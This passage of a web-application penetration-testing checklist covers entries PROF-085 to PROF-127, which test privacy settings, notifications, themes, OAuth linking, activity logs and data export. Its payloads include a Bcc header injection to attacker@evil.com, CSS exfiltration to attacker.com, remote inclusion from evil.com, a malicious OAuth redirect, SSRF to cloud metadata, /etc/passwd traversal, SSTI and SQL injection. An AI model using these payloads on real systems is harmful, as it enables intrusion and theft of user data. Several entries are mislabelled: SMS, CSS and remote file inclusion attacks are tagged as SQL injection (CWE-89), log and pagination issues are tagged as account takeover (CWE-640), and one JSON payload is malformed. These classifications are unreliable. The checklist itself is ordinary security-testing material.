**Payload Example:**

```
GET /api/users?include_deleted=true
```

**Impact:** Sensitive data / secret exposure -&gt; credential or token disclosure enabling further attack.

**Tools:** Burp Suite / Postman

**References:** CWE-200; -&gt;[JWT checklist](#/checklist/jwt); OWASP WSTG-ATHN; PortSwigger

---

## PROF-085 — IDOR on Privacy Settings
**Test Category:** Broken Access Control · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Privacy Settings - privacy-settings fields

**Test Steps:** 1. Update privacy settings 2. Modify user ID in request 3. Change another user's privacy

**Expected Result:** Application should verify ownership

**Payload Example:**

```
PUT /api/user/victim_id/privacy
```

**Impact:** IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale.

**Tools:** Burp Suite / Postman

**References:** CWE-639; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA

---

## PROF-086 — Privacy Settings Bypass via API
**Test Category:** Broken Access Control · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Privacy Settings - privacy-settings fields

**Test Steps:** 1. Set profile to private 2. Access profile via different API endpoint 3. Check if privacy enforced

**Expected Result:** Privacy should be enforced across all endpoints

**Payload Example:**

```
GET /api/v2/user/private_user_id
```

**Impact:** Privacy violation -&gt; exposure of personal data (PII) beyond the intended audience.

**Tools:** Burp Suite / Postman

**References:** CWE-359; -&gt;[IDOR / BOLA checklist](#/checklist/idor); OWASP Privacy Risks; GDPR

---

## PROF-087 — Privacy Settings CSRF
**Test Category:** Cross-Site Request Forgery · **Severity:** Medium · **CVSS:** 6.1 (CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N)

**Where to Test / Injection Point:** Privacy Settings - privacy-settings fields

**Test Steps:** 1. Create malicious page to change privacy settings 2. Trick victim to visit 3. Check if settings changed

**Expected Result:** Privacy changes should require CSRF token

**Payload Example:**

```
<form action="/privacy/update" method="POST">
```

**Impact:** CSRF on a state-changing action -&gt; forced account/settings change, chainable to ATO.

**Tools:** Burp Suite CSRF PoC / Custom HTML

**References:** CWE-352; -&gt;[CSRF checklist](#/checklist/csrf); PortSwigger CSRF + SameSite

---

## PROF-088 — Privacy Enumeration
**Test Category:** Information Disclosure · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Privacy Settings - privacy-settings fields

**Test Steps:** 1. Query various users 2. Compare responses for public vs private profiles 3. Enumerate private users

**Expected Result:** Application should not reveal existence of private users

**Payload Example:**

```
Different error messages for private vs non-existent
```

**Impact:** Username/account enumeration -&gt; a valid-target list that fuels credential stuffing / phishing / ATO.

**Tools:** Burp Suite Intruder / ffuf

**References:** CWE-204; -&gt;[Account Takeover checklist](#/checklist/ato); OWASP WSTG-IDNT-04

---

## PROF-089 — Cache Leakage of Private Data
**Test Category:** Information Disclosure · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Privacy Settings - privacy-settings fields

**Test Steps:** 1. View private profile as authorized user 2. Check if cached 3. Access cache as unauthorized user

**Expected Result:** Private data should not be cached

**Payload Example:**

```
Cache-Control header analysis
```

**Impact:** Privacy violation -&gt; exposure of personal data (PII) beyond the intended audience.

**Tools:** Burp Suite / Browser DevTools

**References:** CWE-359; -&gt;[IDOR / BOLA checklist](#/checklist/idor); OWASP Privacy Risks; GDPR

---

## PROF-090 — GraphQL Introspection Privacy Bypass
**Test Category:** Information Disclosure · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Privacy Settings - privacy-settings fields

**Test Steps:** 1. Query GraphQL schema 2. Find hidden fields 3. Query private data directly

**Expected Result:** GraphQL should enforce field-level privacy

**Payload Example:**

```
query { __schema { types { fields { name } } } }
```

**Impact:** Privacy violation -&gt; exposure of personal data (PII) beyond the intended audience.

**Tools:** GraphQL Voyager / Altair

**References:** CWE-359; -&gt;[IDOR / BOLA checklist](#/checklist/idor); OWASP Privacy Risks; GDPR

---

## PROF-091 — Mass Assignment on Privacy Fields
**Test Category:** Broken Access Control · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Privacy Settings - privacy-settings fields

**Test Steps:** 1. Update profile with privacy field included 2. Check if privacy setting changed

**Expected Result:** Privacy fields should not be mass-assignable

**Payload Example:**

```
{"name":"test"isPrivate:false}
```

**Impact:** Mass assignment / parameter pollution -&gt; privilege escalation (role/isAdmin/isVerified) or ownership takeover.

**Tools:** Burp Suite / Postman

**References:** CWE-915; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Mass assignment; OWASP API3 BOPLA

---

## PROF-092 — Privacy Settings Not Applied to Exports
**Test Category:** Privacy Violation · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Privacy Settings - privacy-settings fields

**Test Steps:** 1. Set strict privacy 2. Export profile data 3. Check if private data included

**Expected Result:** Exports should respect privacy settings

**Payload Example:**

```
Download user data and check contents
```

**Impact:** Privacy violation -&gt; exposure of personal data (PII) beyond the intended audience.

**Tools:** Burp Suite / Manual Testing

**References:** CWE-359; -&gt;[IDOR / BOLA checklist](#/checklist/idor); OWASP Privacy Risks; GDPR

---

## PROF-093 — Email Header Injection
**Test Category:** Injection · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Notification Preferences - notification-preference fields

**Test Steps:** 1. Set notification email with injection payload 2. Trigger notification 3. Check email headers

**Expected Result:** Application should sanitize email addresses

**Payload Example:**

```
email=test@test.com%0aBcc:attacker@evil.com
```

**Impact:** CRLF/response-splitting -&gt; header injection, cache poisoning, session fixation.

**Tools:** Burp Suite / Email Analysis

**References:** CWE-113; -&gt;[Host Header Injection checklist](#/checklist/hostheader); OWASP CRLF Injection; PortSwigger

---

## PROF-094 — SMS Injection
**Test Category:** Injection · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Notification Preferences - notification-preference fields

**Test Steps:** 1. Set notification phone number 2. Include injection payload 3. Trigger SMS notification

**Expected Result:** Application should validate phone numbers

**Payload Example:**

```
phone=1234567890;premium_number
```

**Impact:** SQL injection at this feature boundary -&gt; auth bypass / full DB read-write / data breach (and RCE on some stacks).

**Tools:** Burp Suite / Postman

**References:** CWE-89; -&gt;[SQL Injection checklist](#/checklist/sqli); PortSwigger SQLi; PayloadsAllTheThings

---

## PROF-095 — IDOR on Notification Settings
**Test Category:** Broken Access Control · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Notification Preferences - notification-preference fields

**Test Steps:** 1. Update notification settings 2. Modify user ID 3. Change another user's preferences

**Expected Result:** Application should verify ownership

**Payload Example:**

```
PUT /api/user/victim_id/notifications
```

**Impact:** IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale.

**Tools:** Burp Suite / Postman

**References:** CWE-639; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA

---

## PROF-096 — Notification Flooding
**Test Category:** Denial of Service · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Notification Preferences - notification-preference fields

**Test Steps:** 1. Enable all notifications 2. Trigger events rapidly 3. Attempt to flood user inbox

**Expected Result:** Application should rate limit notifications

**Payload Example:**

```
Trigger 1000+ notifications per minute
```

**Impact:** Missing anti-automation/rate-limit -&gt; brute force, OTP/2FA guessing, resource-flood abuse.

**Tools:** Burp Suite / Custom Scripts

**References:** CWE-799; -&gt;[Account Takeover checklist](#/checklist/ato); OWASP WSTG-ATHN-04; PortSwigger

---

## PROF-097 — XSS in Notification Content
**Test Category:** Cross-Site Scripting · **Severity:** Medium · **CVSS:** 6.1 (CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N)

**Where to Test / Injection Point:** Notification Preferences - notification-preference fields

**Test Steps:** 1. Set notification preferences 2. Include XSS in customizable content 3. View notifications

**Expected Result:** Notification content should be sanitized

**Payload Example:**

```
<script>alert('XSS')</script>
```

**Impact:** Stored/reflected XSS in this feature -&gt; session/token theft, cross-user account compromise.

**Tools:** Burp Suite / XSS Hunter

**References:** CWE-79; -&gt;[XSS checklist](#/checklist/xss); PortSwigger XSS; Cure53

---

## PROF-098 — Webhook URL SSRF
**Test Category:** Server-Side Request Forgery · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Notification Preferences - notification-preference fields

**Test Steps:** 1. Set webhook URL for notifications 2. Use internal URL 3. Trigger notification

**Expected Result:** Application should validate webhook URLs

**Payload Example:**

```
http://localhost:8080/admin or http://169.254.169.254/
```

**Impact:** SSRF -&gt; internal-service reach / cloud metadata credential theft.

**Tools:** Burp Suite / SSRFmap

**References:** CWE-918; -&gt;[SSRF checklist](#/checklist/ssrf); Orange Tsai 'A New Era of SSRF'; PortSwigger

---

## PROF-099 — Notification Token Leakage
**Test Category:** Information Disclosure · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Notification Preferences - notification-preference fields

**Test Steps:** 1. Analyze notification requests 2. Check for exposed tokens 3. Attempt token hijacking

**Expected Result:** Notification tokens should not be exposed

**Payload Example:**

```
Push notification tokens in response
```

**Impact:** Sensitive data / secret exposure -&gt; credential or token disclosure enabling further attack.

**Tools:** Burp Suite / Mobile Proxy

**References:** CWE-200; -&gt;[JWT checklist](#/checklist/jwt); OWASP WSTG-ATHN; PortSwigger

---

## PROF-100 — Stored XSS via Custom Theme
**Test Category:** Cross-Site Scripting · **Severity:** High · **CVSS:** 8.2 (CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:L/A:N)

**Where to Test / Injection Point:** Language / Theme Preferences - locale / theme parameter

**Test Steps:** 1. Create custom theme with XSS 2. Save preferences 3. View page with theme applied

**Expected Result:** Theme should sanitize CSS and prevent XSS

**Payload Example:**

```
background: url('javascript:alert(1)')
```

**Impact:** Stored/reflected XSS in this feature -&gt; session/token theft, cross-user account compromise.

**Tools:** Burp Suite / XSS Hunter

**References:** CWE-79; -&gt;[XSS checklist](#/checklist/xss); PortSwigger XSS; Cure53

---

## PROF-101 — CSS Injection
**Test Category:** Injection · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Language / Theme Preferences - locale / theme parameter

**Test Steps:** 1. Insert CSS in theme customization 2. Exfiltrate data via CSS

**Expected Result:** Application should sanitize CSS input

**Payload Example:**

```
input[value^="a"]{background:url(attacker.com/a)}
```

**Impact:** SQL injection at this feature boundary -&gt; auth bypass / full DB read-write / data breach (and RCE on some stacks).

**Tools:** Burp Suite / Custom CSS

**References:** CWE-89; -&gt;[SQL Injection checklist](#/checklist/sqli); PortSwigger SQLi; PayloadsAllTheThings

---

## PROF-102 — Path Traversal in Language File
**Test Category:** Path Traversal · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Language / Theme Preferences - locale / theme parameter

**Test Steps:** 1. Set language preference 2. Use path traversal in language code 3. Access system files

**Expected Result:** Application should validate language codes

**Payload Example:**

```
lang=../../../etc/passwd
```

**Impact:** Path traversal -&gt; secret/cross-user file read or out-of-dir write -&gt; RCE.

**Tools:** Burp Suite / DotDotPwn

**References:** CWE-22; -&gt;[Path Traversal checklist](#/checklist/pathtraversal); PortSwigger path traversal; Orange Tsai

---

## PROF-103 — Remote File Inclusion
**Test Category:** Injection · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Language / Theme Preferences - locale / theme parameter

**Test Steps:** 1. Set theme URL 2. Use external malicious theme URL 3. Check for inclusion

**Expected Result:** Application should not allow remote themes

**Payload Example:**

```
theme_url=http://evil.com/malicious.css
```

**Impact:** SQL injection at this feature boundary -&gt; auth bypass / full DB read-write / data breach (and RCE on some stacks).

**Tools:** Burp Suite / Postman

**References:** CWE-89; -&gt;[SQL Injection checklist](#/checklist/sqli); PortSwigger SQLi; PayloadsAllTheThings

---

## PROF-104 — IDOR on Theme Settings
**Test Category:** Broken Access Control · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Language / Theme Preferences - locale / theme parameter

**Test Steps:** 1. Update theme settings 2. Modify user ID 3. Change another user's theme

**Expected Result:** Application should verify ownership

**Payload Example:**

```
PUT /api/user/victim_id/theme
```

**Impact:** IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale.

**Tools:** Burp Suite / Postman

**References:** CWE-639; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA

---

## PROF-105 — Template Injection via Language
**Test Category:** Server-Side Template Injection · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Language / Theme Preferences - locale / theme parameter

**Test Steps:** 1. Set custom language string 2. Include SSTI payload 3. View rendered page

**Expected Result:** Application should not process user input as templates

**Payload Example:**

```
{{constructor.constructor('return this')()}}
```

**Impact:** Server-side template injection -&gt; remote code execution on the app server.

**Tools:** Burp Suite / Tplmap

**References:** CWE-1336; -&gt;[SSTI checklist](#/checklist/ssti); PortSwigger SSTI (James Kettle)

---

## PROF-106 — OAuth Token Theft
**Test Category:** Broken Authentication · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Linked Accounts Management - OAuth link/unlink flow

**Test Steps:** 1. Capture OAuth callback 2. Steal authorization code 3. Exchange for access token

**Expected Result:** OAuth should validate redirect_uri strictly

**Payload Example:**

```
redirect_uri=https://attacker.com/callback
```

**Impact:** OAuth/SSO flaw -&gt; code/token theft or identity confusion -&gt; account takeover.

**Tools:** Burp Suite / OAuth Tools

**References:** CWE-287; -&gt;[OAuth / OIDC / SAML checklist](#/checklist/oauth); OAuth Security BCP (RFC 9700); PortSwigger

---

## PROF-107 — OAuth CSRF
**Test Category:** Cross-Site Request Forgery · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Linked Accounts Management - OAuth link/unlink flow

**Test Steps:** 1. Generate OAuth link without state parameter 2. Trick victim to click 3. Link attacker's account to victim

**Expected Result:** OAuth should require state parameter validation

**Payload Example:**

```
OAuth URL without state parameter
```

**Impact:** OAuth/SSO flaw -&gt; code/token theft or identity confusion -&gt; account takeover.

**Tools:** Burp Suite / Manual Testing

**References:** CWE-287; -&gt;[OAuth / OIDC / SAML checklist](#/checklist/oauth); OAuth Security BCP (RFC 9700); PortSwigger

---

## PROF-108 — Account Takeover via OAuth
**Test Category:** Broken Authentication · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Linked Accounts Management - OAuth link/unlink flow

**Test Steps:** 1. Link OAuth account 2. Unlink original email 3. Take over account via OAuth only

**Expected Result:** Application should prevent removing all auth methods

**Payload Example:**

```
Remove email while OAuth linked
```

**Impact:** OAuth/SSO flaw -&gt; code/token theft or identity confusion -&gt; account takeover.

**Tools:** Burp Suite / Manual Testing

**References:** CWE-287; -&gt;[OAuth / OIDC / SAML checklist](#/checklist/oauth); OAuth Security BCP (RFC 9700); PortSwigger

---

## PROF-109 — OAuth Scope Escalation
**Test Category:** Broken Access Control · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Linked Accounts Management - OAuth link/unlink flow

**Test Steps:** 1. Initiate OAuth with minimal scope 2. Modify scope in request 3. Gain additional permissions

**Expected Result:** Application should validate requested scopes

**Payload Example:**

```
scope=read -> scope=read+write+admin
```

**Impact:** OAuth/SSO flaw -&gt; code/token theft or identity confusion -&gt; account takeover.

**Tools:** Burp Suite / Postman

**References:** CWE-287; -&gt;[OAuth / OIDC / SAML checklist](#/checklist/oauth); OAuth Security BCP (RFC 9700); PortSwigger

---

## PROF-110 — IDOR on Linked Account Removal
**Test Category:** Broken Access Control · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Linked Accounts Management - OAuth link/unlink flow

**Test Steps:** 1. Remove linked account 2. Modify user ID 3. Unlink another user's OAuth

**Expected Result:** Application should verify ownership

**Payload Example:**

```
DELETE /api/user/victim_id/linked-accounts/google
```

**Impact:** IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale.

**Tools:** Burp Suite / Postman

**References:** CWE-639; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA

---

## PROF-111 — Open Redirect in OAuth Flow
**Test Category:** Open Redirect · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Linked Accounts Management - OAuth link/unlink flow

**Test Steps:** 1. Analyze OAuth redirect parameters 2. Insert external URL 3. Steal OAuth tokens

**Expected Result:** Redirect should only allow whitelisted URLs

**Payload Example:**

```
redirect_uri=https://attacker.com
```

**Impact:** OAuth/SSO flaw -&gt; code/token theft or identity confusion -&gt; account takeover.

**Tools:** Burp Suite / Manual Testing

**References:** CWE-287; -&gt;[OAuth / OIDC / SAML checklist](#/checklist/oauth); OAuth Security BCP (RFC 9700); PortSwigger

---

## PROF-112 — OAuth Token Leakage in Referer
**Test Category:** Information Disclosure · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Linked Accounts Management - OAuth link/unlink flow

**Test Steps:** 1. Complete OAuth flow 2. Click external link 3. Check if token in Referer header

**Expected Result:** Tokens should not be in URL fragments

**Payload Example:**

```
Check Referer header for tokens
```

**Impact:** OAuth/SSO flaw -&gt; code/token theft or identity confusion -&gt; account takeover.

**Tools:** Burp Suite / Browser DevTools

**References:** CWE-287; -&gt;[OAuth / OIDC / SAML checklist](#/checklist/oauth); OAuth Security BCP (RFC 9700); PortSwigger

---

## PROF-113 — Duplicate Account Linking
**Test Category:** Business Logic · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Linked Accounts Management - OAuth link/unlink flow

**Test Steps:** 1. Link same OAuth account to multiple users 2. Check for conflicts 3. Test account takeover

**Expected Result:** OAuth accounts should only link to one user

**Payload Example:**

```
Link same Google account to two users
```

**Impact:** Business-logic flaw in this flow -&gt; control bypass with security or financial impact.

**Tools:** Burp Suite / Multiple Accounts

**References:** CWE-840; PortSwigger Business logic

---

## PROF-114 — OAuth Callback Injection
**Test Category:** Injection · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Linked Accounts Management - OAuth link/unlink flow

**Test Steps:** 1. Inject payload in OAuth callback 2. Check for XSS or other injection 3. Steal tokens

**Expected Result:** Callback should sanitize all parameters

**Payload Example:**

```
callback?code=<script>alert(1)</script>
```

**Impact:** OAuth/SSO flaw -&gt; code/token theft or identity confusion -&gt; account takeover.

**Tools:** Burp Suite / XSS Hunter

**References:** CWE-287; -&gt;[OAuth / OIDC / SAML checklist](#/checklist/oauth); OAuth Security BCP (RFC 9700); PortSwigger

---

## PROF-115 — IDOR on Activity Log Access
**Test Category:** Broken Access Control · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Activity Log / Login History - activity-log endpoint (userId / entries)

**Test Steps:** 1. View activity log 2. Modify user ID in request 3. View another user's activity

**Expected Result:** Application should verify ownership

**Payload Example:**

```
GET /api/user/victim_id/activity-log
```

**Impact:** IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale.

**Tools:** Burp Suite / Postman

**References:** CWE-639; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA

---

## PROF-116 — Log Injection
**Test Category:** Injection · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Activity Log / Login History - activity-log endpoint (userId / entries)

**Test Steps:** 1. Perform action with injection payload 2. Check activity log 3. Verify for log injection

**Expected Result:** Application should sanitize log entries

**Payload Example:**

```
Login with username: admin\nFailed login: victim
```

**Impact:** Broken auth in this flow -&gt; account takeover of any user (bypass/replay/reset/2FA defeat).

**Tools:** Burp Suite / Manual Testing

**References:** CWE-640; -&gt;[Account Takeover checklist](#/checklist/ato); PortSwigger Authentication; disclosed ATO writeups

---

## PROF-117 — Activity Log XSS
**Test Category:** Cross-Site Scripting · **Severity:** Medium · **CVSS:** 6.1 (CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N)

**Where to Test / Injection Point:** Activity Log / Login History - activity-log endpoint (userId / entries)

**Test Steps:** 1. Perform action that logs user input 2. Include XSS payload 3. View activity log

**Expected Result:** Log display should sanitize entries

**Payload Example:**

```
Action: <script>alert('XSS')</script>
```

**Impact:** Stored/reflected XSS in this feature -&gt; session/token theft, cross-user account compromise.

**Tools:** Burp Suite / XSS Hunter

**References:** CWE-79; -&gt;[XSS checklist](#/checklist/xss); PortSwigger XSS; Cure53

---

## PROF-118 — Log Tampering
**Test Category:** Broken Access Control · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Activity Log / Login History - activity-log endpoint (userId / entries)

**Test Steps:** 1. Capture activity log request 2. Try to delete or modify entries 3. Check for tampering

**Expected Result:** Logs should be immutable for users

**Payload Example:**

```
DELETE /api/activity-log/entry_id
```

**Impact:** Broken auth in this flow -&gt; account takeover of any user (bypass/replay/reset/2FA defeat).

**Tools:** Burp Suite / Postman

**References:** CWE-640; -&gt;[Account Takeover checklist](#/checklist/ato); PortSwigger Authentication; disclosed ATO writeups

---

## PROF-119 — Session Hijacking Detection Bypass
**Test Category:** Broken Authentication · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Activity Log / Login History - activity-log endpoint (userId / entries)

**Test Steps:** 1. Identify suspicious activity detection 2. Modify headers to evade 3. Access account undetected

**Expected Result:** Detection should not rely on spoofable headers

**Payload Example:**

```
X-Forwarded-For manipulation
```

**Impact:** Session fixation/hijack -&gt; attacker rides the victim's authenticated session.

**Tools:** Burp Suite / IP Rotate

**References:** CWE-384; -&gt;[Account Takeover checklist](#/checklist/ato); PortSwigger Session management

---

## PROF-120 — Pagination Bypass
**Test Category:** Broken Access Control · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Activity Log / Login History - activity-log endpoint (userId / entries)

**Test Steps:** 1. Request activity log with modified pagination 2. Access more records than intended 3. Extract all history

**Expected Result:** Pagination should enforce limits

**Payload Example:**

```
page_size=999999 or offset=-1
```

**Impact:** Broken auth in this flow -&gt; account takeover of any user (bypass/replay/reset/2FA defeat).

**Tools:** Burp Suite / Postman

**References:** CWE-640; -&gt;[Account Takeover checklist](#/checklist/ato); PortSwigger Authentication; disclosed ATO writeups

---

## PROF-121 — Time-Based SQL Injection in Log Filters
**Test Category:** Injection · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Activity Log / Login History - activity-log endpoint (userId / entries)

**Test Steps:** 1. Filter activity log by date 2. Inject SQL in date parameter 3. Extract data

**Expected Result:** Application should use parameterized queries

**Payload Example:**

```
date_from=2024-01-01' AND SLEEP(5)--
```

**Impact:** SQL injection at this feature boundary -&gt; auth bypass / full DB read-write / data breach (and RCE on some stacks).

**Tools:** SQLMap / Burp Suite

**References:** CWE-89; -&gt;[SQL Injection checklist](#/checklist/sqli); PortSwigger SQLi; PayloadsAllTheThings

---

## PROF-122 — Session Termination Bypass
**Test Category:** Broken Authentication · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Activity Log / Login History - activity-log endpoint (userId / entries)

**Test Steps:** 1. View active sessions 2. Terminate session 3. Check if session actually invalidated

**Expected Result:** Session termination should be immediate

**Payload Example:**

```
Continue using terminated session
```

**Impact:** Broken auth in this flow -&gt; account takeover of any user (bypass/replay/reset/2FA defeat).

**Tools:** Burp Suite / Multiple Browsers

**References:** CWE-640; -&gt;[Account Takeover checklist](#/checklist/ato); PortSwigger Authentication; disclosed ATO writeups

---

## PROF-123 — Information Disclosure in Logs
**Test Category:** Information Disclosure · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Activity Log / Login History - activity-log endpoint (userId / entries)

**Test Steps:** 1. Perform sensitive actions 2. Check activity log details 3. Look for exposed sensitive data

**Expected Result:** Logs should not contain sensitive data

**Payload Example:**

```
Check for passwords/tokens in logs
```

**Impact:** Broken auth in this flow -&gt; account takeover of any user (bypass/replay/reset/2FA defeat).

**Tools:** Burp Suite / Manual Review

**References:** CWE-640; -&gt;[Account Takeover checklist](#/checklist/ato); PortSwigger Authentication; disclosed ATO writeups

---

## PROF-124 — IDOR on Data Download
**Test Category:** Broken Access Control · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Download My Data (GDPR) - data-export endpoint / export id

**Test Steps:** 1. Request data download 2. Modify user ID 3. Download another user's data

**Expected Result:** Application should verify ownership

**Payload Example:**

```
GET /api/user/victim_id/download-data
```

**Impact:** IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale.

**Tools:** Burp Suite / Postman

**References:** CWE-639; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA

---

## PROF-125 — Data Export Path Traversal
**Test Category:** Path Traversal · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Download My Data (GDPR) - data-export endpoint / export id

**Test Steps:** 1. Request data export 2. Modify filename/path 3. Access system files

**Expected Result:** Application should sanitize file paths

**Payload Example:**

```
filename=../../../etc/passwd
```

**Impact:** Path traversal -&gt; secret/cross-user file read or out-of-dir write -&gt; RCE.

**Tools:** Burp Suite / DotDotPwn

**References:** CWE-22; -&gt;[Path Traversal checklist](#/checklist/pathtraversal); PortSwigger path traversal; Orange Tsai

---

## PROF-126 — Data Export CSRF
**Test Category:** Cross-Site Request Forgery · **Severity:** Medium · **CVSS:** 6.1 (CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N)

**Where to Test / Injection Point:** Download My Data (GDPR) - data-export endpoint / export id

**Test Steps:** 1. Create malicious page requesting data export 2. Trick victim to visit 3. Intercept export

**Expected Result:** Export should require CSRF token and verification

**Payload Example:**

```
<form action="/export-data" method="POST">
```

**Impact:** CSRF on a state-changing action -&gt; forced account/settings change, chainable to ATO.

**Tools:** Burp Suite CSRF PoC / Custom HTML

**References:** CWE-352; -&gt;[CSRF checklist](#/checklist/csrf); PortSwigger CSRF + SameSite

---

## PROF-127 — Sensitive Data Exposure in Export
**Test Category:** Information Disclosure · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Download My Data (GDPR) - data-export endpoint / export id

**Test Steps:** 1. Request data export 2. Analyze exported data 3. Check for internal data exposure

**Expected Result:** Export should not contain internal data

**Payload Example:**

```
password_hash/internal_ids in export
```

